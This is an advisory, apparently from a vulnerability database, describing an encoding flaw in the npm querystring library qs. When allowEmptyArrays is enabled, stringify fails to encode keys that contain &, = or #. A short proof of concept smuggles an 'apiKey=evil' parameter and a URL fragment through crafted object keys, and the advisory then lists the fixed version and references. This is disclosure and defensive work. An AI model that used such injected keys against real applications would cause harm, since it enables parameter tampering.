## Overview
[qs](https://www.npmjs.com/package/qs) is a querystring parser that supports nesting and arrays, with a depth limit.

Affected versions of this package are vulnerable to Improper Encoding or Escaping of Output via the `stringify` function when the `allowEmptyArrays` option is enabled. When an object key contains special characters (such as `&`, `=`, or `#`) and its value is an empty array, the key is returned without encoding, allowing an attacker who controls a key name to inject arbitrary query-string parameters or URL fragments into the serialized output. A consumer that parses the resulting string will see attacker-controlled key-value pairs that were not present in the original object.
## PoC
```js
var qs = require("qs");

var query = qs.stringify({ q: "hi", "x&apiKey=evil&y": [] }, { allowEmptyArrays: true });
// "q=hi&x&apiKey=evil&y[]"
qs.parse(query);
// { q: "hi", x: "", apiKey: "evil", y: [""] }

qs.stringify({ "x#": [], z: "1" }, { allowEmptyArrays: true });
// "x#[]&z=1": in a URL, everything after "#" becomes the fragment
```

**Note:** The PoC uses the `qs` npm package with the `allowEmptyArrays` option and states no specific runtime version or operating system.
## Remediation
Upgrade `qs` to version 6.16.2 or higher.
## References
- [GitHub Advisory](https://github.com/ljharb/qs/security/advisories/GHSA-w4cr-vjpx-p82q)
- [GitHub Commit](https://github.com/ljharb/qs/commit/234d5051f5071efaa025a7ca9e4d34a56a460a1b)
- [GitHub Commit](https://github.com/ljharb/qs/commit/5d3b1b9ec6afd0cfc760c8e12862873789a32fc8)
- [GitHub Issue](https://github.com/ljharb/qs/issues/626)
- [GitHub PR](https://github.com/ljharb/qs/pull/561)

